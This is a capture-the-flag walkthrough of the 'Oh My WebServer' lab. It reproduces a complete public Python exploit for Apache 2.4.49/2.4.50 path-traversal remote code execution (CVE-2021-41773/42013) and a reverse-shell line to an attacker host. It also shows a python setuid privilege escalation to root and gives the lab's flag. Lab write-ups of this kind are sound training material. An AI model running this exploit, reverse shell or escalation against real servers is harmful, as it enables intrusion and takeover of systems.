# Oh My WebServer!


1. Enumerate with nmap. Ports 22 and 80 are open. The web server is running apache 2.4.49
```
root@ip-10-10-157-86:~# sudo nmap -sS -A 10.10.138.144

Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-19 00:08 BST
Nmap scan report for ip-10-10-138-144.eu-west-1.compute.internal (10.10.138.144)
Host is up (0.00047s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
MAC Address: 02:6B:CD:E1:E8:7B (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 (92%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), Linux 3.13 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms ip-10-10-138-144.eu-west-1.compute.internal (10.10.138.144)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.68 seconds
```

2. Brute force directories with gobuster. Check the website and we find that it's just a simple template from [UIdeck](https://uideck.com/). Going through `/assets` doesn't reveal any important infomation.
```
root@ip-10-10-157-86:~# gobuster dir -u http://10.10.138.144/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.138.144/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/04/19 00:10:38 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/cgi-bin/ (Status: 403)
/index.html (Status: 200)
===============================================================
2022/04/19 00:10:39 Finished
===============================================================
```

3. Doing some research into apache 2.4.49 we find that it has a [critical vulnerability](https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2021-41773) that can lead to RCE. Searching for exploits, we find this python script.
```
# Exploit Title: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)
# Date: 11/11/2021
# Exploit Author: Valentin Lobstein
# Vendor Homepage: https://apache.org/
# Software Link: https://github.com/Balgogan/CVE-2021-41773
# Version: Apache 2.4.49/2.4.50 (CGI enabled)
# Tested on: Debian GNU/Linux
# CVE : CVE-2021-41773 / CVE-2021-42013
# Credits : Lucas Schnell


#!/usr/bin/env python3
#coding: utf-8

import os
import re
import sys
import time
import requests
from colorama import Fore,Style


header = '''\033[1;91m
    
     \u2584\u2584\u2584       \u2588\u2588\u2593\u2588\u2588\u2588   \u2584\u2584\u2584       \u2584\u2588\u2588\u2588\u2588\u2584   \u2588\u2588\u2591 \u2588\u2588 \u2593\u2588\u2588\u2588\u2588\u2588     \u2588\u2588\u2580\u2588\u2588\u2588   \u2584\u2588\u2588\u2588\u2588\u2584  \u2593\u2588\u2588\u2588\u2588\u2588 
    \u2592\u2588\u2588\u2588\u2588\u2584    \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2584    \u2592\u2588\u2588\u2580 \u2580\u2588  \u2593\u2588\u2588\u2591 \u2588\u2588\u2592\u2593\u2588   \u2580    \u2593\u2588\u2588 \u2592 \u2588\u2588\u2592\u2592\u2588\u2588\u2580 \u2580\u2588  \u2593\u2588   \u2580 
    \u2592\u2588\u2588  \u2580\u2588\u2584  \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2592\u2588\u2588  \u2580\u2588\u2584  \u2592\u2593\u2588    \u2584 \u2592\u2588\u2588\u2580\u2580\u2588\u2588\u2591\u2592\u2588\u2588\u2588      \u2593\u2588\u2588 \u2591\u2584\u2588 \u2592\u2592\u2593\u2588    \u2584 \u2592\u2588\u2588\u2588   
    \u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 \u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592\u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 \u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2591\u2593\u2588 \u2591\u2588\u2588 \u2592\u2593\u2588  \u2584    \u2592\u2588\u2588\u2580\u2580\u2588\u2584  \u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2592\u2593\u2588  \u2584 
    \u2593\u2588   \u2593\u2588\u2588\u2592\u2592\u2588\u2588\u2592 \u2591  \u2591 \u2593\u2588   \u2593\u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2591\u2593\u2588\u2592\u2591\u2588\u2588\u2593\u2591\u2592\u2588\u2588\u2588\u2588\u2592   \u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2591\u2592\u2588\u2588\u2588\u2588\u2592
    \u2592\u2592   \u2593\u2592\u2588\u2591\u2592\u2593\u2592\u2591 \u2591  \u2591 \u2592\u2592   \u2593\u2592\u2588\u2591\u2591 \u2591\u2592 \u2592  \u2591 \u2592 \u2591\u2591\u2592\u2591\u2592\u2591\u2591 \u2592\u2591 \u2591   \u2591 \u2592\u2593 \u2591\u2592\u2593\u2591\u2591 \u2591\u2592 \u2592  \u2591\u2591\u2591 \u2592\u2591 \u2591
    \u2592   \u2592\u2592 \u2591\u2591\u2592 \u2591       \u2592   \u2592\u2592 \u2591  \u2591  \u2592    \u2592 \u2591\u2592\u2591 \u2591 \u2591 \u2591  \u2591     \u2591\u2592 \u2591 \u2592\u2591  \u2591  \u2592    \u2591 \u2591  \u2591
    \u2591   \u2592   \u2591\u2591         \u2591   \u2592   \u2591         \u2591  \u2591\u2591 \u2591   \u2591        \u2591\u2591   \u2591 \u2591           \u2591 
''' + Style.RESET_ALL


if len(sys.argv) < 2 :
    print( 'Use: python3 file.py ip:port ' )
    sys.exit()

def end():
    print("\t\033[1;91m[!] Bye bye !")
    time.sleep(0.5)
    sys.exit(1)

def commands(url,command,session):
    directory = mute_command(url,'pwd')
    user = mute_command(url,'whoami')
    hostname = mute_command(url,'hostname')
    advise = print(Fore.YELLOW + 'Reverse shell is advised (This isn\'t an interactive shell)')
    command = input(f"{Fore.RED}\u256d\u2500{Fore.GREEN + user}@{hostname}: {Fore.BLUE + directory}\n{Fore.RED}\u2570\u2500{Fore.YELLOW}$ {Style.RESET_ALL}")    
    command = f"echo; {command};"
    req = requests.Request('POST', url=url, data=command)
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)
    output = response.text
    print(output)
    if 'clear' in command:
        os.system('/usr/bin/clear')
        print(header)
    if 'exit' in command:
        end()

def mute_command(url,command):
    session = requests.Session()
    req = requests.Request('POST', url=url, data=f"echo; {command}")
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)
    return response.text.strip()


def exploitRCE(payload):
    s = requests.Session()
    try:
        host = sys.argv[1]
        if 'http' not in host:
            url = 'http://'+ host + payload
        else:
            url = host + payload 
        session = requests.Session()
        command = "echo; id"
        req = requests.Request('POST', url=url, data=command)
        prepare = req.prepare()
        prepare.url = url  
        response = session.send(prepare, timeout=5)
        output = response.text
        if "uid" in output:
            choice = "Y"
            print( Fore.GREEN + '\n[!] Target %s is vulnerable !!!' % host)
            print("[!] Sortie:\n\n" + Fore.YELLOW + output )
            choice = input(Fore.CYAN + "[?] Do you want to exploit this RCE ? (Y/n) : ")
            if choice.lower() in ['','y','yes']:
                while True:
                    commands(url,command,session)  
            else:
                end()       
        else :
            print(Fore.RED + '\nTarget %s isn\'t vulnerable' % host)
    except KeyboardInterrupt:
        end()

def main():
    try:
        apache2449_payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        apache2450_payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
        payloads = [apache2449_payload,apache2450_payload]
        choice = len(payloads) + 1
        print(header)
        print("\033[1;37m[0] Apache 2.4.49 RCE\n[1] Apache 2.4.50 RCE")
        while choice >= len(payloads) and choice >= 0:
            choice = int(input('[~] Choice : '))
            if choice < len(payloads):
                exploitRCE(payloads[choice])
    except KeyboardInterrupt:
            print("\n\033[1;91m[!] Bye bye !")
            time.sleep(0.5)
            sys.exit(1)

if __name__ == '__main__':
    main()
```

4. Run it with the required arguments, select `Apache 2.4.49 RCE`, and get a shell. This isn't a fully interactive shell, so run `sh -i >& /dev/tcp/<attacker ip>/4444 0>&1` on the server and catch the reverse shell with netcat `nc -nvlp 4444`. Then completely [stabilize the shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) with ssty
```
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

5. Now download linpeas onto your machine, host a simple http server with `python3 -m http.server`, and download it onto the `/tmp` folder of the attacker machine with `curl <url> > /tmp/linpeas.sh`. Run it and examine the output to find that this is running inside a docker container, and python has setuid capabilities set.
```
Files with capabilities (limited to 50):
/usr/bin/python3.7 = cap_setuid+ep
```

6. [GTFObins](https://gtfobins.github.io/gtfobins/python/#capabilities) shows that we can exploit the python misconfiguration with `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`. Using `whoami` shows us that we're root. Navigating to the `/root` folder, we find `user.txt` and the first flag `THM{eacffefe1d2aafcc15e70dc2f07f7ac1}`
